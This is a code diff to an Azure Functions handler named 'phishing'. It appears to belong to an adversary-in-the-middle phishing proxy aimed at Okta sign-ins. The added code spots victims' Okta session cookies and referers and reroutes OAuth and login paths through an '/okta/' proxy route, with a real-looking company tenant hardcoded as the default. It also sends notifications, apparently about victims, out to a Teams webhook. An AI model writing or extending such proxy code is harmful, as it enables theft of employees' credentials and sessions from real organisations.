@@ -35,23 +35,121 @@ app.http("phishing", {
   authLevel: "anonymous",
   route: "/{*x}",
   handler: async (request, context) => {
+    const url = new URL(request.url);
+    
+    // Check if this looks like an Okta session redirect
+    // If the user has Okta cookies (idx, sid, JSESSIONID) and is hitting root,
+    // redirect them back to Okta dashboard
+    const cookies = request.headers.get('cookie') || '';
+    const hasOktaSession = cookies.includes('idx=') || 
+                           cookies.includes('sid=') || 
+                           cookies.includes('JSESSIONID=');
+    
+    // Also check the referer to see if they came from an Okta page
+    const referer = request.headers.get('referer') || '';
+    const cameFromOkta = referer.includes('/okta/') || referer.includes('.okta.com');
+    
+    // Extract Okta domain from referer if available
+    let oktaDomain = 'carters.okta.com'; // Default
+    const refererMatch = referer.match(/\/okta\/([^\/]+)/);
+    if (refererMatch) {
+      oktaDomain = refererMatch[1];
+    }
+    
+    // CRITICAL: Check if this is an Okta OAuth/API request that should go to Okta
+    // These requests come without the /okta/ prefix because the SDK uses window.location.origin
+    const isOktaOAuthPath = url.pathname.startsWith('/oauth2/') || 
+                            url.pathname.startsWith('/api/v1/') ||
+                            url.pathname.startsWith('/idp/') ||
+                            url.pathname.startsWith('/login/') ||
+                            url.pathname.startsWith('/enduser/') ||
+                            url.pathname.startsWith('/.well-known/');
+    
+    if (isOktaOAuthPath && (hasOktaSession || cameFromOkta)) {
+      // Redirect to the Okta proxy route with full path and query string
+      const redirectUrl = `/okta/${oktaDomain}${url.pathname}${url.search}`;
+      context.log(`Detected Okta OAuth request, redirecting to ${redirectUrl}`);
+      
+      return new Response(null, {
+        status: 302,
+        headers: {
+          'Location': redirectUrl,
+          'Cache-Control': 'no-cache, no-store, must-revalidate',
+        },
+      });
+    }
+    
+    // If hitting root "/" with Okta session indicators, redirect to Okta dashboard
+    if ((url.pathname === '/' || url.pathname === '') && (hasOktaSession || cameFromOkta)) {
+      context.log(`Detected Okta session redirect to root, redirecting to /okta/${oktaDomain}/app/UserHome`);
+      
+      return new Response(null, {
+        status: 302,
+        headers: {
+          'Location': `/okta/${oktaDomain}/app/UserHome`,
+          'Cache-Control': 'no-cache, no-store, must-revalidate',
+        },
+      });
+    }
 
     async function dispatchMessage(message) {
       context.log(message);
       if (teams_webhook_url) {
-        await fetch(teams_webhook_url, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({ text: message }),
-        })
-          .then((response) =>
-            response.ok
-              ? console.log("successfully dispatched MSG")
-              : console.error(`Failed to dispatch: ${response.statusText}`)
-          )
-          .catch((error) => console.log(error));
+        // Convert HTML to plain text for the adaptive card
+        const plainText = message
+          .replace(/<br>/gi, '\n')
+          .replace(/<b>/gi, '**')
+          .replace(/<\/b>/gi, '**')
+          .replace(/<code>/gi, '`')
+          .replace(/<\/code>/gi, '`')
+          .replace(/<[^>]*>/g, '');
+        
+        // Try Power Automate Workflow format (Adaptive Card)
+        const adaptiveCardPayload = {
+          type: "message",
+          attachments: [{
+            contentType: "application/vnd.microsoft.card.adaptive",
+            content: {
+              "$schema": "http://adaptivecards.io/schemas/adaptive-card.json",
+              type: "AdaptiveCard",
+              version: "1.4",
+              body: [{
+                type: "TextBlock",
+                text: plainText,
+                wrap: true
+              }]
+            }
+          }]
+        };
+        
+        // Also prepare legacy format as fallback
+        const legacyPayload = { text: message };
+        
+        try {
+          // Try Adaptive Card format first (for Power Automate Workflows)
+          let response = await fetch(teams_webhook_url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(adaptiveCardPayload),
+          });
+          
+          // If that fails, try legacy format (for O365 Connectors)
+          if (!response.ok) {
+            response = await fetch(teams_webhook_url, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify(legacyPayload),
+            });
+          }
+          
+          if (response.ok) {
+            context.log("Successfully dispatched Teams notification");
+          } else {
+            context.log(`Failed to dispatch Teams notification: ${response.status} ${response.statusText}`);
+          }
+        } catch (error) {
+          context.log(`Error dispatching Teams notification: ${error.message}`);
+        }
       }
     }
 
